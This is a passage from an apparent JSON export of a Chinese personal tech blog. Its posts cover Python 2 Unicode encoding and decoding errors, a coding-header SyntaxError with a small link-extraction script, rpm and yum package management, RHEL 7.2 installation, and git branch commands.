字节序列的时候，来看一个例子，把一串 unicode 字符串保存到文件 12345# -*- coding:utf-8 -*-def main(): name = u'Python之禅' f = open(\"output.txt\", \"w\") f.write(name) 错误日志 UnicodeEncodeError: ‘ascii’ codec can’t encode characters in position 6-7: ordinal not in range(128) 为什么会出现 UnicodeEncodeError？ 因为调用 write 方法时，Python 会先判断字符串是什么类型，如果是 str，就直接写入文件，不需要编码，因为 str 类型的字符串本身就是一串二进制的字节序列了。 如果字符串是 unicode 类型，那么它会先调用 encode 方法把 unicode 字符串转换成二进制形式的 str 类型，才保存到文件，而 encode 方法会使用 python 默认的 ascii 码来编码 相当于： 1&gt;&gt;&gt; u\"Python之禅\".encode(\"ascii\") 但是，我们知道 ASCII 字符集中只包含了128个拉丁字母，不包括中文字符，因此 出现了 ‘ascii’ codec can’t encode characters 的错误。要正确地使用 encode ，就必须指定一个包含了中文字符的字符集，比如：UTF-8、GBK。 12345&gt;&gt;&gt; u\"Python之禅\".encode(\"utf-8\")'Python\\xe4\\xb9\\x8b\\xe7\\xa6\\x85'&gt;&gt;&gt; u\"Python之禅\".encode(\"gbk\")'Python\\xd6\\xae\\xec\\xf8' 所以要把 unicode 字符串正确地写入文件，就应该预先把字符串进行 UTF-8 或 GBK 编码转换。 12345def main(): name = u'Python之禅' name = name.encode('utf-8') with open(\"output.txt\", \"w\") as f: f.write(name) 当然，把 unicode 字符串正确地写入文件不止一种方式，但原理是一样的，这里不再介绍，把字符串写入数据库，传输到网络都是同样的原理 UnicodeDecodeErrorUnicodeDecodeError 发生在 str 类型的字节序列解码成 unicode 类型的字符串时 12345678910&gt;&gt;&gt; a = u\"禅\"&gt;&gt;&gt; au'\\u7985'&gt;&gt;&gt; b = a.encode(\"utf-8\")&gt;&gt;&gt; b'\\xe7\\xa6\\x85'&gt;&gt;&gt; b.decode(\"gbk\")Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;UnicodeDecodeError: 'gbk' codec can't decode byte 0x85 in position 2: incomplete multibyte sequence 把一个经过 UTF-8 编码后生成的字节序列 ‘\\xe7\\xa6\\x85’ 再用 GBK 解码转换成 unicode 字符串时，出现 UnicodeDecodeError，因为 （对于中文字符）GBK 编码只占用两个字节，而 UTF-8 占用3个字节，用 GBK 转换时，还多出一个字节，因此它没法解析。避免 UnicodeDecodeError 的关键是保持 编码和解码时用的编码类型一致。 这也回答了文章开头说的字符 “禅”，保存到文件中有可能占3个字节，有可能占2个字节，具体处决于 encode 的时候指定的编码格式是什么。 再举一个 UnicodeDecodeError 的例子 1234567&gt;&gt;&gt; x = u\"Python\"&gt;&gt;&gt; y = \"之禅\"&gt;&gt;&gt; x + yTraceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;UnicodeDecodeError: 'ascii' codec can't decode byte 0xe4 in position 0: ordinal not in range(128)&gt;&gt;&gt; str 与 unicode 字符串 执行 + 操作是，Python 会把 str 类型的字节序列隐式地转换成（解码）成 和 x 一样的 unicode 类型，但Python是使用默认的 ascii 编码来转换的，而 ASCII 中不包含中文，所以报错了。 1234&gt;&gt;&gt; y.decode('ascii')Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;UnicodeDecodeError: 'ascii' codec can't decode byte 0xe4 in position 0: ordinal not in range(128) 正确地方式应该是显示地把 y 用 UTF-8 或者 GBK 进行解码。 12345&gt;&gt;&gt; x = u\"Python\"&gt;&gt;&gt; y = \"之禅\"&gt;&gt;&gt; y = y.decode(\"utf-8\")&gt;&gt;&gt; x + yu'Python\\u4e4b\\u7985'","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"SyntaxError","slug":"SyntaxError","permalink":"http://blog.vimiix.com/tags/SyntaxError/"}]},{"title":"Python-SyntaxError:Non-ASCII character '\\e8' in....","slug":"Python-SyntaxError-Non-ASCII-character-e8-in","date":"2017-03-15T14:53:51.000Z","updated":"2017-03-28T06:02:26.861Z","comments":true,"path":"2017/03/15/Python-SyntaxError-Non-ASCII-character-e8-in.html","link":"","permalink":"http://blog.vimiix.com/2017/03/15/Python-SyntaxError-Non-ASCII-character-e8-in.html","excerpt":"SyntaxError:Non-ASCII character ‘\\e8’ in File…","text":"SyntaxError:Non-ASCII character ‘\\e8’ in File… 遇到下面这种提示的错误 修正方法：检查文件头部的UTF-8编码语句是否书写正确1#coding=utf-8 &lt;/ iframe&gt; 今天下午同事梦鸽遇到一个问题，想直接把要找的一篇网页源代码中的特定的链接找出来，看到她需要每天手动复制粘贴出来然后一点一点删除，这样来找的话，效率也太低了。刚好我最近也刚开始学习python编程，何不写个脚本练练手？ 所以就花了一个多小时帮梦鸽童鞋写了一个自动抓取链接的脚本，虽然开始一直头疼不会正则表达式该怎么写，但最终用笨办法：通过用 循环 条件 逻辑 这些基本的运算符，帮她实现了这个功能。 在这个过程中，遇到了最上面的这个错误，排查了半天以为是哪里的标点符号用成了中文字符，最后一想’Non-ASCII’意思就是找不到对应的ASCII码，既然找不到，是不是文件的编码格式错了，才想起来回头去看文件头部的 #coding = utf-8 这句话，我居然写成了 #condind=utf-8 改正确以后就没问题了。 很巧的是，同在一起学习python的QQ群同学，晚上也遇到了同样的问题，毫不犹豫的帮他找到了问题所在，顿时感觉半个多小时拍错过程是值得的。 特记录这篇日记，希望以后不要再出错。 附python源码，抓取网页中CSDN博主的文章链接，并保存到blogID.txt文件中123456789101112131415161718192021#coding=utf-8import refp = open('sample.txt')#要打开的文件名temp = fp.read()blogID = open('BlogID.txt', 'w') #新建一个文件夹tmp_list = re.findall(r\"(?&lt;=href=\\\").+?(?=\\\")|(?&lt;=href=\\').+?(?=\\')\",temp)#检索出页面所有链接url_list = []for i in tmp_list:if ('blogdevteam' not in i) and ('cloumn' not in i) and ('article' in i) and ('http://blog.csdn.net' in i): if i not in url_list: url_list.append(i)#print url_list#blogID.write(str(url_list))for url in url_list:if url in url_list: print &gt;&gt; blogID , urlblogID.close()fp.close()","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"SyntaxError","slug":"SyntaxError","permalink":"http://blog.vimiix.com/tags/SyntaxError/"}]},{"title":"Linux-软件包管理","slug":"Linux-软件包管理（rpm，yum）","date":"2017-03-13T14:41:08.000Z","updated":"2017-05-25T17:07:50.417Z","comments":true,"path":"2017/03/13/Linux-软件包管理（rpm，yum）.html","link":"","permalink":"http://blog.vimiix.com/2017/03/13/Linux-软件包管理（rpm，yum）.html","excerpt":"来一首歌当背景音乐","text":"来一首歌当背景音乐 rpm软件包管理简称: Redhat Package Manager 挂载光盘[root@localhost ~]# umount /dev/sr0 卸载[root@localhost ~]# mount /dev/sr0 /mnt/ 挂载 rpm包名结构zsh-5.0.2-14.el7.x86_64.rpm zsh -5 .0 .2 -el7 x86 64 软件名 主版本号 次版本号 修订号 RHEL7 CPU架构平台 支持系统位数 安装rpm软件 -i, –install 安装软件包 –nodeps 不验证软件包依赖 -v, –verbose 提供更多的详细信息输出 -h, –hash 软件包安装的时候列出哈希标记 rpm查询功能rpm -qa… -a 查询所有已安装的软件包 -f 查询 文件所属软件包 -p 查询软件包（通常用来看下还未安装的软件包） -i 显示软件包信息 -l 显示软件包中的文件列表 -d 显示被标注为文档的文件列表 -c 显示被标注为配置文件的文件列表 通常可以配合管道 | more 来使用，使得结果更易读。 rpm包 升级 rpm -Uvh [包名] rpm包 卸载 rpm -e [包名] yum软件包管理YUM 自动装软件包（软件包管理） 解决依赖关系问题、自动下载软件包，基于C/S架构。 配置本地yum源的配置文件[root@localhost ~]#monut /dev/sr0 /mnt #挂载光盘 [root@localhost ~]# rm -rf /etc/yum.repos.d/* [root@localhost ~]# vim /etc/yum.repos.d/rhel7.repo [rhel7-yum] #yum源名称，唯一的，用来区分不同的yum源 name=rhel7-source #对yum源描述信息 baseurl=file:///mnt #yum源的路径（repodata目录所在的目录） #或baseurl=http://mirrors.aliyun.com/help/epel #或baseurl=ftp://192.168.1.63/pub enabled=1 #为1，表示启用yum源 gpgcheck=0 #为1，使用公钥检验rpm的正确性 主要操作 安装 yum install -y 检测升级 yum check-update 升级 yum update 软件包查询 yum list 软件包信息 yum info 卸载 yum remove 帮助 yum -help 或 man yum 安装一组软件包 yum grouplist 查看包组 yum groupinstall “Security Tools” yum groupinstall “安全性工具” -y","categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.vimiix.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://blog.vimiix.com/tags/Linux/"},{"name":"rpm","slug":"rpm","permalink":"http://blog.vimiix.com/tags/rpm/"},{"name":"yum","slug":"yum","permalink":"http://blog.vimiix.com/tags/yum/"}]},{"title":"Linux-rhel7.2操作系统安装","slug":"Linux-rhel7-2操作系统安装","date":"2017-03-08T15:00:31.000Z","updated":"2017-05-25T17:07:30.257Z","comments":true,"path":"2017/03/08/Linux-rhel7-2操作系统安装.html","link":"","permalink":"http://blog.vimiix.com/2017/03/08/Linux-rhel7-2操作系统安装.html","excerpt":"","text":"RHEL7红帽公司发布的企业Linux7版本。 RHEL6与RHEL7的关键区别： 显著提升 Docker 的兼容性 （Docker容器级虚拟化技术） 默认文件系统从 EXT4 改为 XFS 系统管理的进一步简化 新版本内核 3.10 提供更多文件系统的支持 RHEL7的安装启动画面 界面说明： Install Red Hat Enterprise Linux 7.2 #安装RHEL 7.2 Test this media &amp; install Red Hat Enterprise Linux 7.2 #测试安装文件并安装RHEL 7.2 Troubleshooting #修复故障 一般选择第一项就可以了 注：在Trobleshooting模式下，界面如下： 界面说明： Install Red Hat Enterprise Linux 7.2 in basic graphics mod #基本图形化安装 Rescue a Red Hat Enterprise Linux system #修复系统 Run a memory test #运行内存测试系统 Boot from local drive #本地设备启动 Return to main menu #返回主菜单 这里选择第一项，安装RHEL 7.1，回车 进入下面的界面，按回车开始安装 选择语言：中文-简体中文（中国） #正式生产服务器建议安装英文版本，单击继续按钮 进入一站式安装界面，在此界面，只需把所有带”!”内容的感叹号全部消除，便可进行安装 时区选择，设置完成，单击完成按钮 键盘选择，单击 + 按钮，添加新的键盘布局方式，选中要添加的语言，然后单击添加即可，添加完成后，单击完成按钮 验证光盘完整性，单击验证，验证光盘或镜像是否完整，防止安装过程出现软件包不完整 额外软件仓库，可以不用选择，单击完成按钮 软件包选择，初学者建议选择带GUI的服务器，同时把开发工具相关的软件包也安装上，然后单击完成 选择-系统-安装位置，进入磁盘分区界面 选择-其它存储选项-分区-我要配置分区，点左上角的“完成”，进入下面的界面，在分区方案有标准分区，btrfs，LVM，LVM简单配置，这里默认LVM就可以，然后单击创建新的分区，分区提前规划好，一般swap分区为物理内存的1.5~2倍（物理内存2G的话，swap可以设置4G），/boot分区500M，/分区10G，实际工作中可以创建数据分区，一般把数据和系统分开 创建/boot分区 设备类型选择默认的标准分区，文件系统类型为xfs，RHEL7支持brtfs，生产环境不建议选择，btrfs文件系统目前技术尚未成熟，只是作为一种前瞻技术 创建swap分区 创建/分区（根分区） 必须创建的分区 /boot / swap交换分区，虚拟内存 swap创建标准：物理内存1.5~2倍如果物理内存超过4G，一般直接把swap创建4G就够了 Swap分区的应用场景： 当物理内存不够用的时候 使用交换分区。 必须与根目录放在同一分区的目录： /bin /sbin /lib /etc /dev 这五个目录。绝对不可与/所在的分区分开，因为这五个目录，包含必要的系统工具与资料。当根目录开机被挂载进来时，需要这些工具与资料来维持正常的运作。若是把这五个目录放到其它分区中，系统就不能正常引导。 可以与根目录放在不同分区的目录（不建议）： /cdrom /mnt /media /proc /run /sys /srv等 这些目录虽然可以放到其它的分区，但不需要这么做。因为这些目录只是为了维持运行所需，且大多不会占用空间，放到其它分区，也无益于系统的性能。如/mnt,/media, /cdrom 只是为实体存储媒体提供挂载点而已；又如/proc，/sys其实是内存上的数据，上面所有的数据完全不会占用硬盘的空间。所以这些目录不需要额外的分区存放。 分区创建完成，单击完成按钮，弹出下图，点击接受更改 KDUMP选项配置，本选项普通用户去掉勾选，关闭即可 网络配置，开启以太网连接，将会自动获取IP地址，如果要手动配置，单击“配置(O)…”按钮 全部配置完成之后，单击开始安装，进行系统安装 进入安装界面，这里需要配置用户密码 安装过程（然后就是漫长等待…可以去抽根烟了） 进入启动界面 首次启动配置，许可认证-&gt;同意许可-&gt;完成配置 登录系统，选择未列出，输入用户名root 搞定！","categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.vimiix.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://blog.vimiix.com/tags/Linux/"},{"name":"rhel7.2","slug":"rhel7-2","permalink":"http://blog.vimiix.com/tags/rhel7-2/"},{"name":"操作系统","slug":"操作系统","permalink":"http://blog.vimiix.com/tags/操作系统/"}]},{"title":"Linux-git branch用法（查看、新建、删除、重命名）","slug":"Linux-git-branch用法（查看、新建、删除、重命名）","date":"2017-03-08T02:41:08.000Z","updated":"2017-05-25T17:07:13.438Z","comments":true,"path":"2017/03/08/Linux-git-branch用法（查看、新建、删除、重命名）.html","link":"","permalink":"http://blog.vimiix.com/2017/03/08/Linux-git-branch用法（查看、新建、删除、重命名）.html","excerpt":"","text":"查看分支git branch [-r|-a]:1、git branch 查看本地所有分支 2、git branch -r 查看远程所有分支 3、git branch -a 查看本地和远程所有分支 新建分支git branch [-f] ：1、git branch 新建分支，但不切换到新分支 2、git checkout -b 新建并切换到新分支 删除分支git branch (-d|-D) :1、git branch -d 删除本地分支 2、git branch -d -r 删除远程分支，删除后，还要推送（ git push origin : ）到服务器才可以。 重命名分支git branch (-m|-M) :使用-m表示强制重命名。 如果需要重命名远程分支，建议的做法是： 1、删除远程待修改的分支 2、push本地新分支名到远程 it中 参数解释-d--delete:删除 -D--delete --force 强制删除的快捷方式 -f--force:强制 -m--move:移动或重命名 -M--move --force 强制移动或重命名的快捷方式 -r--remote：远程 -a--all:所有","categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.vimiix.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://blog.vimiix.com/tags/Linux/"},{"name":"git","slug":"git","permalink":"http://blog.vimiix.com/tags/git/"},{"name":"branch","slug":"branch","permalink":"http://blog.vimiix.com/tags/branch/"}]}]}